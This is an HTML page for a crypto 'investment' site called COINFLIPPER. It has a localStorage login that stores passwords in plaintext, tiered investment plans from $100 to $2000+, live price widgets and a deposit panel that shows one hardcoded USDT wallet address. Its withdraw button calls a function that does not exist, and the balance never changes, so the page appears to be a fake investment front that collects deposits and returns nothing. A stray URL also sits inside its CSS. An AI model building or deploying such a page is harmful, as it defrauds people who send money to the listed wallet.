<!DOCTYPE html>
<html>
<head>
<title>COINFLIPPER</title>
<meta name="viewport" content="width=device-width, initial-scale=1">

<style>
body{
  margin:0;
  font-family:Arial;
  background:#0f172a;
  color:white;
}

/* LANDING */
.hero{
  text-align:center;
  padding:20px;
}

/* CRYPTO IMAGES OUTSIDE */
.crypto-row{
  display:flex;
  justify-content:center;
  flex-wrap:wrap;
  gap:10px;
  padding:10px;
}

.crypto-row img{
  width:70px;
  background:white;
  padding:5px;
  border-radius:10px;
}

/* UI */
.container{padding:20px}

.card{
  background:#1e293b;
  padding:15px;
  margin:10px 0;
  border-radius:10px;
}

input,button{
  width:100%;
  padding:10px;
  margin:5px 0;https://coinflipperweb.github.io/coinflipper/
}

button{
  background:#22c55e;
  border:none;
  color:white;
  cursor:pointer;
}

.hidden{display:none}

.plan{
  background:#334155;
  padding:10px;
  margin:5px 0;
  border-radius:10px;
}
</style>
</head>

<body>

<!-- 🔥 LANDING PAGE -->
<div id="loginPage">

<div class="hero">
<h1>COINFLIPPER</h1>
<p>Trade • Invest • Grow</p>
</div>

<!-- CRYPTO IMAGES OUTSIDE DASHBOARD -->
<div class="crypto-row">
<img src="https://cryptologos.cc/logos/bitcoin-btc-logo.png">
<img src="https://cryptologos.cc/logos/ethereum-eth-logo.png">
<img src="https://cryptologos.cc/logos/solana-sol-logo.png">
<img src="https://cryptologos.cc/logos/tether-usdt-logo.png">
</div>

<div class="card">
<h3>Login</h3>

<input id="username" placeholder="Username">
<input id="password" type="password" placeholder="Password">

<button onclick="signup()">Sign Up</button>
<button onclick="login()">Login</button>
</div>

</div>

<!-- 🔥 DASHBOARD -->
<div id="dash" class="container hidden">

<h2>Welcome <span id="user"></span></h2>

<button onclick="logout()" style="background:red">Logout</button>

<!-- WALLET -->
<div class="card">
<h3>💰 Wallet</h3>
<div id="balance">$0</div>
<button onclick="deposit()">Deposit</button>
</div>

<!-- DEPOSIT BOX -->
<div id="depositBox" class="card hidden">
<h3>📥 USDT Wallet</h3><!-- WITHDRAW -->
<div class="card">
<h3>💸 Withdraw</h3>
<button onclick="openWithdraw()">Withdraw Funds</button>
</div>

<input id="wallet" value="TD2xWDcaN1MTCWc5uzSQD6stzQ3vsENECq" readonly>
<button onclick="copyWallet()">Copy Address</button>
</div>

<!-- PLANS -->
<div class="card">
<h3>📈 Investment Plans</h3>

<div class="plan">Basic — $100 - $500</div>
<div class="plan">Pro — $600 - $1000</div>
<div class="plan">VIP — $2000+</div>

</div>

<!-- PRICES -->
<div class="card">
<h3>📊 Live Prices</h3>
<div id="prices">Loading...</div>
</div>

<!-- CHART -->
<div class="card">
<h3>📉 BTC Chart</h3>
<iframe 
src="https://www.tradingview.com/widgetembed/?symbol=BINANCE:BTCUSDT&theme=dark"
width="100%" height="300"></iframe>
</div>

</div>

<script>

let balance = 0;

/* ---------- SIGN UP ---------- */
function signup(){
    let u = username.value;
    let p = password.value;

    if(!u || !p){
        alert("Fill all fields");
        return;
    }

    localStorage.setItem("user_"+u,p);
    alert("Account created! Now login.");
}

/* ---------- LOGIN ---------- */
function login(){
    let u = username.value;
    let p = password.value;

    let saved = localStorage.getItem("user_"+u);

    if(saved === p){
        localStorage.setItem("active",u);
        showDashboard();
    } else {
        alert("Wrong username or password");
    }
}

/* ---------- SHOW DASHBOARD ---------- */
function showDashboard(){
    loginPage.classList.add("hidden");
    dash.classList.remove("hidden");

    let u = localStorage.getItem("active");
    user.innerText = u;

    loadPrices();
}

/* ---------- LOGOUT ---------- */
function logout(){
    localStorage.removeItem("active");
    location.reload();
}

/* ---------- DEPOSIT ---------- */
function deposit(){
    document.getElementById("depositBox").classList.remove("hidden");
}

/* ---------- COPY WALLET ---------- */
function copyWallet(){
    let w = document.getElementById("wallet");
    w.select();
    document.execCommand("copy");
    alert("Copied!");
}

/* ---------- PRICES ---------- */
async function loadPrices(){
    let res = await fetch("https://api.coingecko.com/api/v3/simple/price?ids=bitcoin,ethereum,solana&vs_currencies=usd");
    let d = await res.json();

    prices.innerHTML =
    "BTC: $" + d.bitcoin.usd + "<br>" +
    "ETH: $" + d.ethereum.usd + "<br>" +
    "SOL: $" + d.solana.usd;
}

/* AUTO LOGIN */
if(localStorage.getItem("active")){
    showDashboard();
}

</script>

</body>
</html>
